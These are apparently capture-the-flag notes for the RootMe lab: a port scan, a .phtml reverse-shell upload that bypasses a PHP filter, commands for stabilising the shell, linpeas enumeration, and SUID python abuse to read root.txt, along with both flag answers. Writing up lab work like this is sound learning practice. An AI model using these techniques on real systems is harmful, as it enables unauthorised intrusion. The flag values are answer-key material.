# RootMe
- IP: 10.10.104.72

## Open Ports
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
## Port 80
- interesting directories
  - /uploads
  - /panel
    - /panel disallows php uploads
    - uploaded a reverse shell with .phtml extension

## Reverse shell
- Open NetCat
- Trigger reverse shell by navigating to /uploads/php-reverse-shell.phtml
- Stabilize shell
  - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
  - `export TERM=xterm`
  - `CTRL + Z`
  - `stty raw -echo; fg`

## Find first flag
- `find -name 'user.txt'`
  - /var/www/user.txt
- `cat /var/www/user.txt`
  - THM{y0u_g0t_a_sh3ll}

## Priviledge Escalation
- Use linPeas (download from host python3 server)
  - `./linpeas.sh | tee linlog.txt`
  - Result: python vulnerable
- Check if python has SUID permission
  - find / -perm /4000 2>/dev/null
  - /usr/bin/python
- Goal: root/root.txt
  - python -c 'print(open("/root/root.txt").read())'
  - THM{pr1v1l3g3_3sc4l4t10n}

SOLVED
